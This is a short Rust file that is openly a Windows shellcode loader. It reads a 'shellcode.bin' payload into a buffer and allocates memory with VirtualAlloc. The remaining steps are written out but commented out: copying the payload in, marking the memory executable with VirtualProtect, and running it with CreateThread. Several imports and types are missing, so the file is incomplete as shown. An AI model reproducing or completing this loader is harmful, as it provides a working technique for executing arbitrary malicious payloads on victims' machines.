use std::fs::File;
use std::io::Read;
use winapi;

unsafe extern "system" fn shellcode_execute() -> u8 {
    let mut shellbuffer = Vec::new();

    let mut file = File::open("shellcode.bin").unwrap();
    file.read_to_end(&mut shellbuffer).unwrap();

    let mut allocated: *mut c_void = VirtualAlloc(std::ptr::null_mut(), shellbuffer.len(), MEM_COMMIT, PAGE_READWRITE);

/*    CopyMemory(allocated, shellbuffer.as_ptr() as *const c_void, shellbuffer.len());

    let mut old_protect: DWORD = 0;
    VirtualProtect(allocated, shellbuffer.len(), PAGE_EXECUTE_READ, &mut old_protect);

    let h_thread = CreateThread(std::ptr::null_mut(), 0, allocated as *mut c_void, std::ptr::null_mut(), 0, std::ptr::null_mut());

    WaitForSingleObject(h_thread as *mut c_void, -1); */

    1
}